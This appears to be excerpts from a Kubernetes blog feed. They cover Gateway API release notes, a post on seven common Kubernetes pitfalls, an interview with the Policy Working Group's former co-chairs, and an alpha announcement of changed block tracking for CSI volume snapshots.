<code>wellKnownCACertificates</code>,\nset to &quot;System&quot; to tell the Gateway to use an implementation-specific set of trusted CA Certificates.</p>\n<p>In this example, the BackendTLSPolicy is configured to use certificates defined in the auth-cert ConfigMap\nto connect with a TLS-encrypted upstream connection where pods backing the auth service are expected to serve a\nvalid certificate for <code>auth.example.com</code>. It uses <code>subjectAltNames</code> with a Hostname type, but you may also use a URI type.</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

(See the <a href=\"https://github.com/kubernetes-sigs/gateway-api/issues/1494\">GEP-1494 issue</a> for some background.)</p>\n<p>This Gateway API release adds an Experimental filter in HTTPRoute that tells the Gateway API implementation to call out to an external service to authenticate (and, optionally, authorize) requests.</p>\n<p>This filter is based on the <a href=\"https://www.envoyproxy.io/docs/envoy/latest/configuration/http/http_filters/ext_authz_filter#config-http-filters-ext-authz\">Envoy ext_authz API</a>, and allows talking to an Auth service that uses either gRPC or HTTP for its protocol.</p>\n<p>Both methods allow the configuration of what headers to forward to the Auth service, with the HTTP protocol allowing some extra information like a prefix path.</p>\n<p>A HTTP example might look like this (noting that this example requires the Experimental channel to be installed and an implementation that supports External Auth to actually understand the config):</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

This resource is analogous to the Gateway resource and will initially be mainly used for conformance testing, with plans to extend its use to off-cluster Gateways in the future.</p>\n<p>The Mesh resource is cluster-scoped and, as an experimental feature, is named <code>XMesh</code> and resides in the <code>gateway.networking.x-k8s.io</code> API group. A key field is controllerName, which specifies the mesh implementation responsible for the resource. The resource's <code>status</code> stanza indicates whether the mesh implementation has accepted it and lists the features the mesh supports.</p>\n<p>One of the goals of this GEP is to avoid making it more difficult for users to adopt a mesh. To simplify adoption, mesh implementations are expected to create a default Mesh resource upon startup if one with a matching <code>controllerName</code> doesn't already exist. This avoids the need for manual creation of the resource to begin using a mesh.</p>\n<p>The new XMesh API kind, within the gateway.networking.x-k8s.io/v1alpha1 API group,\nprovides a central point for mesh configuration and feature discovery (source).</p>\n<p>A minimal XMesh object specifies the <code>controllerName</code>:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000; font-weight: bold;\">apiVersion</span>:<span style=\"color: #bbb;\"> </span>gateway.networking.x-k8s.io/v1alpha1<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">kind</span>:<span style=\"color: #bbb;\"> </span>XMesh<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">metadata</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">name</span>:<span style=\"color: #bbb;\"> </span>one-mesh-to-mesh-them-all<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">spec</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">controllerName</span>:<span style=\"color: #bbb;\"> </span>one-mesh.example.com/one-mesh<span style=\"color: #bbb;\">\n</span></span></span></code></pre></div><p>The mesh implementation populates the status field to confirm it has accepted the resource and to list its supported features ( source):</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000; font-weight: bold;\">status</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">conditions</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span>- <span style=\"color: #008000; font-weight: bold;\">type</span>:<span style=\"color: #bbb;\"> </span>Accepted<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">status</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #b44;\">\"True\"</span><span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">reason</span>:<span style=\"color: #bbb;\"> </span>Accepted<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">supportedFeatures</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span>- <span style=\"color: #008000; font-weight: bold;\">name</span>:<span style=\"color: #bbb;\"> </span>MeshHTTPRoute<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span>- <span style=\"color: #008000; font-weight: bold;\">name</span>:<span style=\"color: #bbb;\"> </span>OffClusterGateway<span style=\"color: #bbb;\">\n</span></span></span></code></pre></div><h3 id=\"introducing-default-gateways\">Introducing default Gateways</h3>\n<p>Lead(s): <a href=\"https://github.com/kflynn\">Flynn</a></p>\n<p>GEP-3793: <a href=\"https://github.com/kubernetes-sigs/gateway-api/issues/3793\">Allowing Gateways to program some routes by default</a>.</p>\n<p>For application developers, one common piece of feedback has been the need to explicitly name a parent Gateway for every single north-south Route.

While this reduces the overhead of establishing new connections, it introduces a security risk\nin the context of API gateways.\nThe ability to reuse a single TLS connection across multiple Listeners brings the need to introduce shared client certificate\nconfiguration in order to avoid unauthorized access.</p>\n<h4 id=\"why-sni-based-mtls-is-not-the-answer\">Why SNI-based mTLS is not the answer</h4>\n<p>One might think that using Server Name Indication (SNI) to differentiate between Listeners would solve this problem.\nHowever, TLS SNI is not a reliable mechanism for enforcing security policies in a connection coalescing scenario.\nA client could use a single TLS connection for multiple peer connections, as long as they are all covered by the same certificate.\nThis means that a client could establish a connection by indicating one peer identity (using SNI), and then reuse that connection\nto access a different virtual host that is listening on the same IP address and port. That reuse, which is controlled by client side\nheuristics, could bypass mutual TLS policies that were specific to the second listener configuration.</p>\n<p>Here's an example to help explain it:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

      "summary": "<p>It’s no secret that Kubernetes can be both powerful and frustrating at times. When I first started dabbling with container orchestration, I made more than my fair share of mistakes enough to compile a whole list of pitfalls. In this post, I want to walk through seven big gotchas I’ve encountered (or seen others run into) and share some tips on how to avoid them. Whether you’re just kicking the tires on Kubernetes or already managing production clusters, I hope these insights help you steer clear of a little extra stress.</p>\n<h2 id=\"1-skipping-resource-requests-and-limits\">1. Skipping resource requests and limits</h2>\n<p><strong>The pitfall</strong>: Not specifying CPU and memory requirements in Pod specifications. This typically happens because Kubernetes does not require these fields, and workloads can often start and run without them—making the omission easy to overlook in early configurations or during rapid deployment cycles.</p>\n<p><strong>Context</strong>:\nIn Kubernetes, resource requests and limits are critical for efficient cluster management. Resource requests ensure that the scheduler reserves the appropriate amount of CPU and memory for each pod, guaranteeing that it has the necessary resources to operate. Resource limits cap the amount of CPU and memory a pod can use, preventing any single pod from consuming excessive resources and potentially starving other pods.\nWhen resource requests and limits are not set:</p>\n<ol>\n<li>Resource Starvation: Pods may get insufficient resources, leading to degraded performance or failures. This is because Kubernetes schedules pods based on these requests. Without them, the scheduler might place too many pods on a single node, leading to resource contention and performance bottlenecks.</li>\n<li>Resource Hoarding: Conversely, without limits, a pod might consume more than its fair share of resources, impacting the performance and stability of other pods on the same node. This can lead to issues such as other pods getting evicted or killed by the Out-Of-Memory (OOM) killer due to lack of available memory.</li>\n</ol>\n<h3 id=\"how-to-avoid-it\">How to avoid it:</h3>\n<ul>\n<li>Start with modest <code>requests</code> (for example <code>100m</code> CPU, <code>128Mi</code> memory) and see how your app behaves.</li>\n<li>Monitor real-world usage and refine your values; the <a href=\"https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/\">HorizontalPodAutoscaler</a> can help automate scaling based on metrics.</li>\n<li>Keep an eye on <code>kubectl top pods</code> or your logging/monitoring tool to confirm you’re not over- or under-provisioning.</li>\n</ul>\n<p><strong>My reality check</strong>: Early on, I never thought about memory limits. Things seemed fine on my local cluster. Then, on a larger environment, Pods got <em>OOMKilled</em> left and right. Lesson learned.\nFor detailed instructions on configuring resource requests and limits for your containers, please refer to <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/assign-memory-resource/\">Assign Memory Resources to Containers and Pods</a>\n(part of the official Kubernetes documentation).</p>\n<h2 id=\"2-underestimating-liveness-and-readiness-probes\">2. Underestimating liveness and readiness probes</h2>\n<p><strong>The pitfall</strong>: Deploying containers without explicitly defining how Kubernetes should check their health or readiness. This tends to happen because Kubernetes will consider a container “running” as long as the process inside hasn’t exited. Without additional signals, Kubernetes assumes the workload is functioning—even if the application inside is unresponsive, initializing, or stuck.</p>\n<p><strong>Context</strong>:<br />\nLiveness, readiness, and startup probes are mechanisms Kubernetes uses to monitor container health and availability.</p>\n<ul>\n<li><strong>Liveness probes</strong> determine if the application is still alive. If a liveness check fails, the container is restarted.</li>\n<li><strong>Readiness probes</strong> control whether a container is ready to serve traffic. Until the readiness probe passes, the container is removed from Service endpoints.</li>\n<li><strong>Startup probes</strong> help distinguish between long startup times and actual failures.</li>\n</ul>\n<h3 id=\"how-to-avoid-it-1\">How to avoid it:</h3>\n<ul>\n<li>Add a simple HTTP <code>livenessProbe</code> to check a health endpoint (for example <code>/healthz</code>) so Kubernetes can restart a hung container.</li>\n<li>Use a <code>readinessProbe</code> to ensure traffic doesn’t reach your app until it’s warmed up.</li>\n<li>Keep probes simple. Overly complex checks can create false alarms and unnecessary restarts.</li>\n</ul>\n<p><strong>My reality check</strong>: I once forgot a readiness probe for a web service that took a while to load. Users hit it prematurely, got weird timeouts, and I spent hours scratching my head. A 3-line readiness probe would have saved the day.</p>\n<p>For comprehensive instructions on configuring liveness, readiness, and startup probes for containers, please refer to <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/\">Configure Liveness, Readiness and Startup Probes</a>\nin the official Kubernetes documentation.</p>\n<h2 id=\"3-we-ll-just-look-at-container-logs-famous-last-words\">3. “We’ll just look at container logs” (famous last words)</h2>\n<p><strong>The pitfall</strong>: Relying solely on container logs retrieved via <code>kubectl logs</code>. This often happens because the command is quick and convenient, and in many setups, logs appear accessible during development or early troubleshooting. However, <code>kubectl logs</code> only retrieves logs from currently running or recently terminated containers, and those logs are stored on the node’s local disk. As soon as the container is deleted, evicted, or the node is restarted, the log files may be rotated out or permanently lost.</p>\n<h3 id=\"how-to-avoid-it-2\">How to avoid it:</h3>\n<ul>\n<li><strong>Centralize logs</strong> using CNCF tools like <a href=\"https://kubernetes.io/docs/concepts/cluster-administration/logging/#sidecar-container-with-a-logging-agent\">Fluentd</a> or <a href=\"https://fluentbit.io/\">Fluent Bit</a> to aggregate output from all Pods.</li>\n<li><strong>Adopt OpenTelemetry</strong> for a unified view of logs, metrics, and (if needed) traces. This lets you spot correlations between infrastructure events and app-level behavior.</li>\n<li><strong>Pair logs with Prometheus metrics</strong> to track cluster-level data alongside application logs. If you need distributed tracing, consider CNCF projects like <a href=\"https://www.jaegertracing.io/\">Jaeger</a>.</li>\n</ul>\n<p><strong>My reality check</strong>: The first time I lost Pod logs to a quick restart, I realized how flimsy “kubectl logs” can be on its own. Since then, I’ve set up a proper pipeline for every cluster to avoid missing vital clues.</p>\n<h2 id=\"4-treating-dev-and-prod-exactly-the-same\">4. Treating dev and prod exactly the same</h2>\n<p><strong>The pitfall</strong>: Deploying the same Kubernetes manifests with identical settings across development, staging, and production environments. This often occurs when teams aim for consistency and reuse, but overlook that environment-specific factors—such as traffic patterns, resource availability, scaling needs, or access control—can differ significantly. Without customization, configurations optimized for one environment may cause instability, poor performance, or security gaps in another.</p>\n<h3 id=\"how-to-avoid-it-3\">How to avoid it:</h3>\n<ul>\n<li>Use environment overlays or <a href=\"https://kustomize.io/\">kustomize</a> to maintain a shared base while customizing resource requests, replicas, or config for each environment.</li>\n<li>Extract environment-specific configuration into ConfigMaps and / or Secrets. You can use a specialized tool such as <a href=\"https://github.com/bitnami-labs/sealed-secrets\">Sealed Secrets</a> to manage confidential data.</li>\n<li>Plan for scale in production. Your dev cluster can probably get away with minimal CPU/memory, but prod might need significantly more.</li>\n</ul>\n<p><strong>My reality check</strong>: One time, I scaled up <code>replicaCount</code> from 2 to 10 in a tiny dev environment just to “test.” I promptly ran out of resources and spent half a day cleaning up the aftermath. Oops.</p>\n<h2 id=\"5-leaving-old-stuff-floating-around\">5. Leaving old stuff floating around</h2>\n<p><strong>The pitfall</strong>: Leaving unused or outdated resources—such as Deployments, Services, ConfigMaps, or PersistentVolumeClaims—running in the cluster. This often happens because Kubernetes does not automatically remove resources unless explicitly instructed, and there is no built-in mechanism to track ownership or expiration. Over time, these forgotten objects can accumulate, consuming cluster resources, increasing cloud costs, and creating operational confusion, especially when stale Services or LoadBalancers continue to route traffic.</p>\n<h3 id=\"how-to-avoid-it-4\">How to avoid it:</h3>\n<ul>\n<li><strong>Label everything</strong> with a purpose or owner label. That way, you can easily query resources you no longer need.</li>\n<li><strong>Regularly audit</strong> your cluster: run <code>kubectl get all -n &lt;namespace&gt;</code> to see what’s actually running, and confirm it’s all legit.</li>\n<li><strong>Adopt Kubernetes’ Garbage Collection</strong>: <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/garbage-collection/\">K8s docs</a> show how to remove dependent objects automatically.</li>\n<li><strong>Leverage policy automation</strong>: Tools like <a href=\"https://kyverno.io/\">Kyverno</a> can automatically delete or block stale resources after a certain period, or enforce lifecycle policies so you don’t have to remember every single cleanup step.</li>\n</ul>\n<p><strong>My reality check</strong>: After a hackathon, I forgot to tear down a “test-svc” pinned to an external load balancer. Three weeks later, I realized I’d been paying for that load balancer the entire time. Facepalm.</p>\n<h2 id=\"6-diving-too-deep-into-networking-too-soon\">6. Diving too deep into networking too soon</h2>\n<p><strong>The pitfall</strong>: Introducing advanced networking solutions—such as service meshes, custom CNI plugins, or multi-cluster communication—before fully understanding Kubernetes' native networking primitives. This commonly occurs when teams implement features like traffic routing, observability, or mTLS using external tools without first mastering how core Kubernetes networking works: including Pod-to-Pod communication, ClusterIP Services, DNS resolution, and basic ingress traffic handling. As a result, network-related issues become harder to troubleshoot, especially when overlays introduce additional abstractions and failure points.</p>\n<h3 id=\"how-to-avoid-it-5\">How to avoid it:</h3>\n<ul>\n<li>Start small: a Deployment, a Service, and a basic ingress controller such as one based on NGINX (e.g., Ingress-NGINX).</li>\n<li>Make sure you understand how traffic flows within the cluster, how service discovery works, and how DNS is configured.</li>\n<li>Only move to a full-blown mesh or advanced CNI features when you actually need them, complex networking adds overhead.</li>\n</ul>\n<p><strong>My reality check</strong>: I tried Istio on a small internal app once, then spent more time debugging Istio itself than the actual app. Eventually, I stepped back, removed Istio, and everything worked fine.</p>\n<h2 id=\"7-going-too-light-on-security-and-rbac\">7. Going too light on security and RBAC</h2>\n<p><strong>The pitfall</strong>: Deploying workloads with insecure configurations, such as running containers as the root user, using the <code>latest</code> image tag, disabling security contexts, or assigning overly broad RBAC roles like <code>cluster-admin</code>. These practices persist because Kubernetes does not enforce strict security defaults out of the box, and the platform is designed to be flexible rather than opinionated. Without explicit security policies in place, clusters can remain exposed to risks like container escape, unauthorized privilege escalation, or accidental production changes due to unpinned images.</p>\n<h3 id=\"how-to-avoid-it-6\">How to avoid it:</h3>\n<ul>\n<li>Use <a href=\"https://kubernetes.io/docs/reference/access-authn-authz/rbac/\">RBAC</a> to define roles and permissions within Kubernetes. While RBAC is the default and most widely supported authorization mechanism, Kubernetes also allows the use of alternative authorizers. For more advanced or external policy needs, consider solutions like <a href=\"https://open-policy-agent.github.io/gatekeeper/\">OPA Gatekeeper</a> (based on Rego), <a href=\"https://kyverno.io/\">Kyverno</a>, or custom webhooks using policy languages such as CEL or <a href=\"https://cedarpolicy.com/\">Cedar</a>.</li>\n<li>Pin images to specific versions (no more <code>:latest</code>!). This helps you know what’s actually deployed.</li>\n<li>Look into <a href=\"https://kubernetes.io/docs/concepts/security/pod-security-admission/\">Pod Security Admission</a> (or other solutions like Kyverno) to enforce non-root containers, read-only filesystems, etc.</li>\n</ul>\n<p><strong>My reality check</strong>: I never had a huge security breach, but I’ve heard plenty of cautionary tales. If you don’t tighten things up, it’s only a matter of time before something goes wrong.</p>\n<h2 id=\"final-thoughts\">Final thoughts</h2>\n<p>Kubernetes is amazing, but it’s not psychic, it won’t magically do the right thing if you don’t tell it what you need. By keeping these pitfalls in mind, you’ll avoid a lot of headaches and wasted time. Mistakes happen (trust me, I’ve made my share), but each one is a chance to learn more about how Kubernetes truly works under the hood.\nIf you’re curious to dive deeper, the <a href=\"https://kubernetes.io/docs/home/\">official docs</a> and the <a href=\"http://slack.kubernetes.io/\">community Slack</a> are excellent next steps. And of course, feel free to share your own horror stories or success tips, because at the end of the day, we’re all in this cloud native adventure together.</p>\n<p><strong>Happy Shipping!</strong></p>",

This article reflects its work, accomplishments, and insights into how a working group operates.)</em></p>\n<p>In the complex world of Kubernetes, policies play a crucial role in managing and securing clusters.

To answer that, let's take a look back at the work of the Policy Working Group.</p>\n<p>The Policy Working Group was dedicated to a critical mission: providing an overall architecture that encompasses both current policy-related implementations and future policy proposals in Kubernetes. Their goal was both ambitious and essential: to develop a universal policy architecture that benefits developers and end-users alike.</p>\n<p>Through collaborative methods, this working group strove to bring clarity and consistency to the often complex world of Kubernetes policies. By focusing on both existing implementations and future proposals, they ensured that the policy landscape in Kubernetes remains coherent and accessible as the technology evolves.</p>\n<p>This blog post dives deeper into the work of the Policy Working Group, guided by insights from its former co-chairs:</p>\n<ul>\n<li><a href=\"https://twitter.com/JimBugwadia\">Jim Bugwadia</a></li>\n<li><a href=\"https://twitter.com/poonam_lamba\">Poonam Lamba</a></li>\n<li><a href=\"https://twitter.com/sudermanjr\">Andy Suderman</a></li>\n</ul>\n<p><em>Interviewed by <a href=\"https://twitter.com/arujjval\">Arujjwal Negi</a>.</em></p>\n<p>These co-chairs explained what the Policy Working Group was all about.</p>\n<h2 id=\"introduction\">Introduction</h2>\n<p><strong>Hello, thank you for the time! Let’s start with some introductions, could you tell us a bit about yourself, your role, and how you got involved in Kubernetes?</strong></p>\n<p><strong>Jim Bugwadia</strong>: My name is Jim Bugwadia, and I am a co-founder and the CEO at Nirmata which provides solutions that automate security and compliance for cloud-native workloads. At Nirmata, we have been working with Kubernetes since it started in 2014. We initially built a Kubernetes policy engine in our commercial platform and later donated it to CNCF as the Kyverno project. I joined the CNCF Kubernetes Policy Working Group to help build and standardize various aspects of policy management for Kubernetes and later became a co-chair.</p>\n<p><strong>Andy Suderman</strong>: My name is Andy Suderman and I am the CTO of Fairwinds, a managed Kubernetes-as-a-Service provider. I began working with Kubernetes in 2016 building a web conferencing platform. I am an author and/or maintainer of several Kubernetes-related open-source projects such as Goldilocks, Pluto, and Polaris. Polaris is a JSON-schema-based policy engine, which started Fairwinds' journey into the policy space and my involvement in the Policy Working Group.</p>\n<p><strong>Poonam Lamba</strong>: My name is Poonam Lamba, and I currently work as a Product Manager for Google Kubernetes Engine (GKE) at Google. My journey with Kubernetes began back in 2017 when I was building an SRE platform for a large enterprise, using a private cloud built on Kubernetes. Intrigued by its potential to revolutionize the way we deployed and managed applications at the time, I dove headfirst into learning everything I could about it. Since then, I've had the opportunity to build the policy and compliance products for GKE. I lead and contribute to GKE CIS benchmarks. I am involved with the Gatekeeper project as well as I have contributed to Policy-WG for over 2 years and served as a co-chair for the group.</p>\n<p><em>Responses to the following questions represent an amalgamation of insights from the former co-chairs.</em></p>\n<h2 id=\"about-working-groups\">About Working Groups</h2>\n<p><strong>One thing even I am not aware of is the difference between a working group and a SIG. Can you help us understand what a working group is and how it is different from a SIG?</strong></p>\n<p>Unlike SIGs, working groups are temporary and focused on tackling specific, cross-cutting issues or projects that may involve multiple SIGs. Their lifespan is defined, and they disband once they've achieved their objective. Generally, working groups don't own code or have long-term responsibility for managing a particular area of the Kubernetes project.</p>\n<p>(To know more about SIGs, visit the <a href=\"https://github.com/kubernetes/community/blob/master/sig-list.md\">list of Special Interest Groups</a>)</p>\n<p><strong>You mentioned that Working Groups involve multiple SIGS. What SIGS was the Policy WG closely involved with, and how did you coordinate with them?</strong></p>\n<p>The group collaborated closely with Kubernetes SIG Auth throughout our existence, and more recently, the group also worked with SIG Security since its formation. Our collaboration occurred in a few ways. We provided periodic updates during the SIG meetings to keep them informed of our progress and activities. Additionally, we utilize other community forums to maintain open lines of communication and ensured our work aligned with the broader Kubernetes ecosystem. This collaborative approach helped the group stay coordinated with related efforts across the Kubernetes community.</p>\n<h2 id=\"policy-wg\">Policy WG</h2>\n<p><strong>Why was the Policy Working Group created?</strong></p>\n<p>To enable a broad set of use cases, we recognize that Kubernetes is powered by a highly declarative, fine-grained, and extensible configuration management system. We've observed that a Kubernetes configuration manifest may have different portions that are important to various stakeholders. For example, some parts may be crucial for developers, while others might be of particular interest to security teams or address operational concerns. Given this complexity, we believe that policies governing the usage of these intricate configurations are essential for success with Kubernetes.</p>\n<p>Our Policy Working Group was created specifically to research the standardization of policy definitions and related artifacts. We saw a need to bring consistency and clarity to how policies are defined and implemented across the Kubernetes ecosystem, given the diverse requirements and stakeholders involved in Kubernetes deployments.</p>\n<p><strong>Can you give me an idea of the work you did in the group?</strong></p>\n<p>We worked on several Kubernetes policy-related projects. Our initiatives included:</p>\n<ul>\n<li>We worked on a Kubernetes Enhancement Proposal (KEP) for the Kubernetes Policy Reports API. This aims to standardize how policy reports are generated and consumed within the Kubernetes ecosystem.</li>\n<li>We conducted a CNCF survey to better understand policy usage in the Kubernetes space. This helped gauge the practices and needs across the community at the time.</li>\n<li>We wrote a paper that will guide users in achieving PCI-DSS compliance for containers. This is intended to help organizations meet important security standards in their Kubernetes environments.</li>\n<li>We also worked on a paper highlighting how shifting security down can benefit organizations. This focuses on the advantages of implementing security measures earlier in the development and deployment process.</li>\n</ul>\n<p><strong>Can you tell us what were the main objectives of the Policy Working Group and some of your key accomplishments?</strong></p>\n<p>The charter of the Policy WG was to help standardize policy management for Kubernetes and educate the community on best practices.</p>\n<p>To accomplish this we updated the Kubernetes documentation (<a href=\"https://kubernetes.io/docs/concepts/policy\">Policies | Kubernetes</a>), produced several whitepapers (<a href=\"https://github.com/kubernetes/sig-security/blob/main/sig-security-docs/papers/policy/CNCF_Kubernetes_Policy_Management_WhitePaper_v1.pdf\">Kubernetes Policy Management</a>, <a href=\"https://github.com/kubernetes/sig-security/blob/main/sig-security-docs/papers/policy_grc/Kubernetes_Policy_WG_Paper_v1_101123.pdf\">Kubernetes GRC</a>), and created the Policy Reports API (<a href=\"https://github.com/kubernetes-retired/wg-policy-prototypes/blob/master/policy-report/docs/api-docs.md\">API reference</a>) which standardizes reporting across various tools. Several popular tools such as Falco, Trivy, Kyverno, kube-bench, and others support the Policy Report API. A major milestone for the Policy WG was promoting the Policy Reports API to a SIG-level API or finding it a stable home.</p>\n<p>Beyond that, as <a href=\"https://kubernetes.io/docs/reference/access-authn-authz/validating-admission-policy/\">ValidatingAdmissionPolicy</a> and <a href=\"https://kubernetes.io/docs/reference/access-authn-authz/mutating-admission-policy/\">MutatingAdmissionPolicy</a> approached GA in Kubernetes, a key goal of the WG was to guide and educate the community on the tradeoffs and appropriate usage patterns for these built-in API objects and other CNCF policy management solutions like OPA/Gatekeeper and Kyverno.</p>\n<h2 id=\"challenges\">Challenges</h2>\n<p><strong>What were some of the major challenges that the Policy Working Group worked on?</strong></p>\n<p>During our work in the Policy Working Group, we encountered several challenges:</p>\n<ul>\n<li>\n<p>One of the main issues we faced was finding time to consistently contribute. Given that many of us have other professional commitments, it can be difficult to dedicate regular time to the working group's initiatives.</p>\n</li>\n<li>\n<p>Another challenge we experienced was related to our consensus-driven model. While this approach ensures that all voices are heard, it can sometimes lead to slower decision-making processes. We valued thorough discussion and agreement, but this can occasionally delay progress on our projects.</p>\n</li>\n<li>\n<p>We've also encountered occasional differences of opinion among group members. These situations require careful navigation to ensure that we maintain a collaborative and productive environment while addressing diverse viewpoints.</p>\n</li>\n<li>\n<p>Lastly, we've noticed that newcomers to the group may find it difficult to contribute effectively without consistent attendance at our meetings. The complex nature of our work often requires ongoing context, which can be challenging for those who aren't able to participate regularly.</p>\n</li>\n</ul>\n<p><strong>Can you tell me more about those challenges? How did you discover each one? What has the impact been? What were some strategies you used to address them?</strong></p>\n<p>There are no easy answers, but having more contributors and maintainers greatly helps! Overall the CNCF community is great to work with and is very welcoming to beginners. So, if folks out there are hesitating to get involved, I highly encourage them to attend a WG or SIG meeting and just listen in.</p>\n<p>It often takes a few meetings to fully understand the discussions, so don't feel discouraged if you don't grasp everything right away. We made a point to emphasize this and encouraged new members to review documentation as a starting point for getting involved.</p>\n<p>Additionally, differences of opinion were valued and encouraged within the Policy-WG. We adhered to the CNCF core values and resolve disagreements by maintaining respect for one another. We also strove to timebox our decisions and assign clear responsibilities to keep things moving forward.</p>\n<hr />\n<p>This is where our discussion about the Policy Working Group ends. The working group, and especially the people who took part in this article, hope this gave you some insights into the group's aims and workings.

      "summary": "<p>We're excited to announce the alpha support for a <em>changed block tracking</em> mechanism. This enhances\nthe Kubernetes storage ecosystem by providing an efficient way for\n<a href=\"https://kubernetes.io/docs/concepts/storage/volumes/#csi\">CSI</a> storage drivers to identify changed\nblocks in PersistentVolume snapshots. With a driver that can use the feature, you could benefit\nfrom faster and more resource-efficient backup operations.</p>\n<p>If you're eager to try this feature, you can <a href=\"https://kubernetes.io/feed.xml#getting-started\">skip to the Getting Started section</a>.</p>\n<h2 id=\"what-is-changed-block-tracking\">What is changed block tracking?</h2>\n<p>Changed block tracking enables storage systems to identify and track modifications at the block level\nbetween snapshots, eliminating the need to scan entire volumes during backup operations. The\nimprovement is a change to the Container Storage Interface (CSI), and also to the storage support\nin Kubernetes itself.\nWith the alpha feature enabled, your cluster can:</p>\n<ul>\n<li>Identify allocated blocks within a CSI volume snapshot</li>\n<li>Determine changed blocks between two snapshots of the same volume</li>\n<li>Streamline backup operations by focusing only on changed data blocks</li>\n</ul>\n<p>For Kubernetes users managing large datasets, this API enables significantly more efficient\nbackup processes. Backup applications can now focus only on the blocks that have changed,\nrather than processing entire volumes.</p>\n<div class=\"alert alert-info\"><h4 class=\"alert-heading\">Note:</h4>As of now, the Changed Block Tracking API is supported only for block volumes and not for\nfile volumes. CSI drivers that manage file-based storage systems will not be able to\nimplement this capability.</div>\n<h2 id=\"benefits-of-changed-block-tracking-support-in-kubernetes\">Benefits of changed block tracking support in Kubernetes</h2>\n<p>As Kubernetes adoption grows for stateful workloads managing critical data, the need for efficient\nbackup solutions becomes increasingly important. Traditional full backup approaches face challenges with:</p>\n<ul>\n<li><em>Long backup windows</em>: Full volume backups can take hours for large datasets, making it difficult\nto complete within maintenance windows.</li>\n<li><em>High resource utilization</em>: Backup operations consume substantial network bandwidth and I/O\nresources, especially for large data volumes and data-intensive applications.</li>\n<li><em>Increased storage costs</em>: Repetitive full backups store redundant data, causing storage\nrequirements to grow linearly even when only a small percentage of data actually changes between\nbackups.</li>\n</ul>\n<p>The Changed Block Tracking API addresses these challenges by providing native Kubernetes support for\nincremental backup capabilities through the CSI interface.</p>\n<h2 id=\"key-components\">Key components</h2>\n<p>The implementation consists of three primary components:</p>\n<ol>\n<li><em>CSI SnapshotMetadata Service API</em>: An API, offered by gRPC, that provides volume\nsnapshot and changed block data.</li>\n<li><em>SnapshotMetadataService API</em>: A Kubernetes CustomResourceDefinition (CRD) that\nadvertises CSI driver metadata service availability and connection details to\ncluster clients.</li>\n<li><em>External Snapshot Metadata Sidecar</em>: An intermediary component that connects CSI\ndrivers to backup applications via a standardized gRPC interface.</li>\n</ol>\n<h2 id=\"implementation-requirements\">Implementation requirements</h2>\n<h3 id=\"storage-provider-responsibilities\">Storage provider responsibilities</h3>\n<p>If you're an author of a storage integration with Kubernetes and want to support the changed block tracking feature, you must implement specific requirements:</p>\n<ol>\n<li>\n<p><em>Implement CSI RPCs</em>: Storage providers need to implement the <code>SnapshotMetadata</code> service as defined in the <a href=\"https://github.com/container-storage-interface/spec/blob/master/csi.proto\">CSI specifications protobuf</a>. This service requires server-side streaming implementations for the following RPCs:</p>\n<ul>\n<li><code>GetMetadataAllocated</code>: For identifying allocated blocks in a snapshot</li>\n<li><code>GetMetadataDelta</code>: For determining changed blocks between two snapshots</li>\n</ul>\n</li>\n<li>\n<p><em>Storage backend capabilities</em>: Ensure the storage backend has the capability to track and report block-level changes.</p>\n</li>\n<li>\n<p><em>Deploy external components</em>: Integrate with the <code>external-snapshot-metadata</code> sidecar to expose the snapshot metadata service.</p>\n</li>\n<li>\n<p><em>Register custom resource</em>: Register the <code>SnapshotMetadataService</code> resource using a CustomResourceDefinition and create a <code>SnapshotMetadataService</code> custom resource that advertises the availability of the metadata service and provides connection details.</p>\n</li>\n<li>\n<p><em>Support error handling</em>: Implement proper error handling for these RPCs according to the CSI specification requirements.</p>\n</li>\n</ol>\n<h3 id=\"backup-solution-responsibilities\">Backup solution responsibilities</h3>\n<p>A backup solution looking to leverage this feature must:</p>\n<ol>\n<li>\n<p><em>Set up authentication</em>: The backup application must provide a Kubernetes ServiceAccount token when using the\n<a 